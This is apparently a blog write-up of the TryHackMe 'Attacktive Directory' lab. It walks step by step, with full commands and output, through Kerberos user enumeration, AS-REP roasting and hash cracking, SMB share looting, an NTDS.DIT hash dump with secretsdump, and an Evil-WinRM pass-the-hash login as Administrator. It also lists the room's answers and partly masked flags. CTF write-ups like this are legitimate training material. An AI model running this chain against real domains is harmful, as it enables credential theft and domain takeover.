---
layout: default
title: Attacktive Directory -TryHackMe Active Directory Lab Solution
category: thm
tags: [thm, nmap, kerbrute, ad, hashcat, machine, ctf, winrm, smb]
---

# Attacktive Directory

- [Tools](#tools)
- [Deploy The Machine](#deploy-the-machine)
- [Setup](#setup)
- [Welcome to Attacktive Directory](#welcome-to-attacktive-directory)
- [Enumerating Users via Kerberos](#enumerating-users-via-kerberos)
- [Abusing Kerberos](#abusing-kerberos)
- [Back to the Basics](#back-to-the-basics)
- [Elevating Privileges within the Domain](#elevating-privileges-within-the-domain)
- [Flag Submission Panel](#flag-submission-panel)

Room Link: [https://thm.com/r/room/attacktivedirectory](https://thm.com/r/room/attacktivedirectory)

## Tools

- [NMap](NMap.org)
- [kerbrute](https://github.com/ropnop/kerbrute/releases)
- [Impacket](https://github.com/fortra/impacket)
- [hashcat](https://hashcat.net/hashcat/)
- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

## Deploy The Machine

- Goto Access and get ovpn file to connect https://thm.com/access Or, Start attackbox for testing.
- `Start Machine` and get Target IP from "Target Machine Information".
- Now, Click on all four Completes.

## Setup

- Follow Instructions in this section, to `Install Impacket, Bloodhound and Neo4j`.
- After installing click on `Complete`.

## Welcome to Attacktive Directory

- Running nmap scan shows some open ports, command used `nmap -sV -sC 10.10.94.138`.

   ```bash
   nmap -sV -sC 10.10.94.138
   Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-24 12:12 IST
   Nmap scan report for 10.10.94.138
   Host is up (0.17s latency).
   Not shown: 987 closed tcp ports (reset)
   PORT     STATE SERVICE       VERSION
   53/tcp   open  domain        Simple DNS Plus
   80/tcp   open  http          Microsoft IIS httpd 10.0
   | http-methods: 
   |_  Potentially risky methods: TRACE
   |_http-server-header: Microsoft-IIS/10.0
   |_http-title: IIS Windows Server
   88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-24 06:49:23Z)
   135/tcp  open  msrpc         Microsoft Windows RPC
   139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
   389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
   445/tcp  open  microsoft-ds?
   464/tcp  open  kpasswd5?
   593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
   636/tcp  open  tcpwrapped
   3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
   3269/tcp open  tcpwrapped
   3389/tcp open  ms-wbt-server Microsoft Terminal Services
   |_ssl-date: 2024-08-24T06:49:42+00:00; 0s from scanner time.
   | rdp-ntlm-info: 
   |   Target_Name: THM-AD
   |   NetBIOS_Domain_Name: THM-AD
   |   NetBIOS_Computer_Name: ATTACKTIVEDIREC
   |   DNS_Domain_Name: spookysec.local
   |   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
   |   Product_Version: 10.0.17763
   |_  System_Time: 2024-08-24T06:49:33+00:00
   | ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
   | Not valid before: 2024-08-23T06:06:09
   |_Not valid after:  2025-02-22T06:06:09
   Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
   
   Host script results:
   | smb2-security-mode: 
   |   3:1:1: 
   |_    Message signing enabled and required
   | smb2-time: 
   |   date: 2024-08-24T06:49:37
   |_  start_date: N/A
   
   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 449.40 seconds
   ```
- Question `What tool will allow us to enumerate port 139/445?` Answer `enum4linux`. `enum4linux` can be used to enumerate `139`/`445` ports.
- Question `What is the NetBIOS-Domain Name of the machine?` Answer `THM-AD`
- Question `What invalid TLD do people commonly use for their Active Directory Domain?` Answer `.local`

## Enumerating Users via Kerberos

- Now, we will bruteforce Kerberos with [kerbrute](https://github.com/ropnop/kerbrute/releases) using given `userlist.txt` and `passwordlist.txt`. So, at first we need to download those wordlists and install `kerbrute`.
- Assign `spookysec.local` to machine ip is in `host` file. We can simply edit `/etc/hosts` file in Linux to assign domain to the ip.
- We can use this command `kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt` to enumerate users. We got some valid usernames after scanning.
   ```bash
   james@spookysec.local
   svc-admin@spookysec.local
   robin@spookysec.local
   darkstar@spookysec.local
   administrator@spookysec.local
   backup@spookysec.local
   paradox@spookysec.local
   ```
- Question `What command within Kerbrute will allow us to enumerate valid usernames?` Answer `userenum`.
- Question `What notable account is discovered? (These should jump out at you)` Answer `svc-admin`. `svc-admin` typically suggests a `service account` (`svc`) with `administrative privileges` (`admin`).
- Question `What is the other notable account is discovered? (These should jump out at you)` Answer `backup`.

## Abusing Kerberos

- Read this section, then proceed.
- We can use `GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass` or `GetNPUsers.py -dc-ip spookysec.local spookysec.local/ -no-pass -usersfile user.txt` after saving all users to `user.txt` to capture `TGT Token` of `svc-admin` using ASREPRoasting method.
   
```bash
GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:92f01444cd97361751ec4fb5b5ea985a$04b60fa94a84739e7db13609241d16247154e8d1f952c26a0c5063e53d08c9a4365690982460f7872d8ade23113cd4df929c85d5404f4380fdcaa5af2ee22d7988d7ee428e535be1b2dcff88bf574d418ca88c3b435cea77b6ea322b510bcf59ac1fba479d54db52104c3bec497cf1b81ddcd384bbb5d115ba2c380f0520705c7b63c88f548f17a9c6c8c1b746175b896b29555a45002ad5195a90d42c45193e42915a1107ed46a6b79da94b835f5e7bd8858c0bb7f07fecab80f7097c769da284ea270697500ea73ea223d93684e8d087248610cf7809d076d5e97564e9729ec5aa04656eaec9f3f5a92ecfaa8524346e93
```

- Question `We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?` Answer `svc-admin`
- Question `Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)` Answer `Kerberos 5 AS-REP etype 23`. Source: https://hashcat.net/wiki/doku.php?id=example_hashes
- Question `What mode is the hash?` Answer `18200` Source: https://hashcat.net/wiki/doku.php?id=example_hashes
- We can save the `TGT hash` inside a file named `hash.txt` with given passwordlist and crack it with `hashcat -m 18200 hash.txt passwordlist.txt`.
- Question `Now crack the hash with the modified password list provided, what is the user accounts password?` Answer `management2005`
   
## Back to the Basics

- If we enumerate with smbclient we can see some shares. Used command `smbclient -L \\\\spookysec.local\\ -U 'svc-admin'` using password `management2005`. 

```bash
smbclient -L \\\\spookysec.local\\ -U 'svc-admin'
Password for [WORKGROUP\svc-admin]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

- If we check `backup` share with `smbclient` using `smbclient \\\\spookysec.local\\backup -U 'svc-admin'` command and password `management2005`, We can see `backup_credentials.txt` file there with `ls` or `dir` command. Then we can download `backup_credentials.txt` with `get backup_credentials.txt` command.

```bash
ORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 00:38:39 2020
  ..                                  D        0  Sun Apr  5 00:38:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 00:38:53 2020

		8247551 blocks of size 4096. 3648829 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 

```

- Inside it there is a `base64` encoded string `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`. If we decode it using `cat backup_credentials.txt |base64 -d` command we will get `backup@spookysec.local:backup2517860`.
- Question `What utility can we use to map remote SMB shares?` Answer `smbclient`
- Question `Which option will list shares?` Answer `-L`
- Question `How many remote shares is the server listing?` Answer `6`
- Question `There is one particular share that we have access to that contains a text file. Which share is it?` Answer `backup`
- Question `What is the content of the file?` Answer `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
- Question `Decoding the contents of the file, what is the full contents?` Answer `backup@spookysec.local:backup2517860`

## Elevating Privileges within the Domain

- We can dump password hashes, as backup account has that permission using `secretsdump.py -dc-ip spookysec.local backup:backup251786@spookysec.local` command.

```bash
secretsdump.py -dc-ip spookysec.local backup:backup2517860@spookysec.local
Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213*******97260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
.........
..............
```

- Question `What method allowed us to dump NTDS.DIT?` Answer `DRSUAPI`
- Question `What is the Administrators NTLM hash?` Answer `0e0363213e37b94221497260b0bcb4fc`
- Question `What method of attack could allow us to authenticate as the user without the password?` Answer `Pass the hash`
- Question `Using a tool called Evil-WinRM what option will allow us to use a hash?` Answer `-H`

## Flag Submission Panel

- We can login to administrator using `evil-winrm` with `evil-winrm -i spookysec.local -u Administrator -H 0e03632*******b0bcb4fc` command. We can get three flag files inside three directory.

```bash
evil-winrm -i spookysec.local -u Administrator -H 0e036321*****97260b0bcb4fc                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\svc-admin\Desktop\user.txt.txt
TryHackMe{K3rb3****4uth}
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\backup\Desktop\PrivEsc.txt
TryHackMe{B4c*****c0tty!}
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
TryHackMe{4ctive*****toryM4st3r}
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

- Question `svc-admin` Answer `TryHackMe{K3rb3*****3_4uth}`
- Question `backup` Answer `TryHackMe{B4*****0tty!}`
- Question `administrator` Answer `TryHackMe{4ctiv******M4st3r}`

   
